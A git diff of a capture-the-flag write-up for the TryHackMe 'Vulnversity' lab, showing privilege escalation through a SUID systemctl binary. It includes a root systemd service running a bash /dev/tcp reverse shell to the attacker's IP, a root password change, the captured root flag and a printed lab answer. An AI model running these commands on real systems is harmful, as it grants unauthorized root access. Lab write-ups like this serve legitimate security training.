@@ -1,7 +1,7 @@
 # Vulnversity
 
 ```
-export IP=""
+export IP=10.10.53.246
 ```
 
 ## NMAP
@@ -237,6 +237,7 @@ find / -type f -perm -4000
 ```
 
 ```
+/bin/passwd
 /bin/su
 /bin/ntfs-3g
 /bin/mount
@@ -245,10 +246,12 @@ find / -type f -perm -4000
 /bin/systemctl
 /bin/ping
 /bin/fusermount
+...
 ```
 
 ##### Root flag:
-```
+
+```bash
 www-data@vulnuniversity:/$ cat /root/root.txt
 cat: /root/root.txt: Permission denied
 ```
@@ -257,10 +260,9 @@ Using systemctl to create a service to run as root:
 
 ```bash
 cd /tmp
-touch getroot.sh
-chmod u+x getroot.sh
-# echo "cat /root/root.txt > /tmp/key.txt" >> /tmp/getroot.sh
-# echo "usermod -g sudo www-data" >> /tmp/getroot.sh
+touch getrootflag.sh
+chmod u+x getrootflag.sh
+echo "cat /root/root.txt > /tmp/key.txt" >> /tmp/getrootflag.sh
 ```
 
 Systemctl service:
@@ -270,14 +272,14 @@ Description=Example systemd service.
 
 [Service]
 Type=simple
-ExecStart=/bin/bash /tmp/getroot.sh
+ExecStart=/bin/bash /tmp/getrootflag.sh
 
 [Install]
-WantedBy=multi-user.target" > /tmp/pwned.service
+WantedBy=multi-user.target" > /tmp/getrootflag.service
 ```
 
-systemctl enable /tmp/pwned.service
-systemctl start pwned
+systemctl enable /tmp/getrootflag.service
+systemctl start getrootflag
 
 ```
 www-data@vulnuniversity:/tmp$ cat key.txt
@@ -285,4 +287,56 @@ cat key.txt
 a58ff8579f0a9270368d33a9966c7fd5
 ```
 
-TODO get full root access
+##### root reverse shell
+
+```
+nc -lvnp 7777
+```
+
+Host THM IP: 10.18.10.39
+
+
+---
+
+[Bash TCP reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)
+
+Using systemctl to create a getroot.service to run as root:
+
+```
+echo "[Unit]
+Description=Get root reverse shell.
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.18.10.39/7777 0>&1'
+
+[Install]
+WantedBy=multi-user.target" > /tmp/getroot.service
+```
+
+```bash
+systemctl enable /tmp/getroot.service
+systemctl start getroot
+```
+
+```
+Listening on 0.0.0.0 7777
+Connection received on 10.10.53.246 44768
+bash: cannot set terminal process group (1715): Inappropriate ioctl for device
+bash: no job control in this shell
+root@vulnuniversity:/# whoami
+whoami
+root
+root@vulnuniversity:/# passwd
+passwd
+Enter new UNIX password: newpasswd
+Retype new UNIX password: newpasswd
+passwd: password updated successfully
+```
+
+```bash
+ssh root@$IP
+```
+
+PWNED ✅
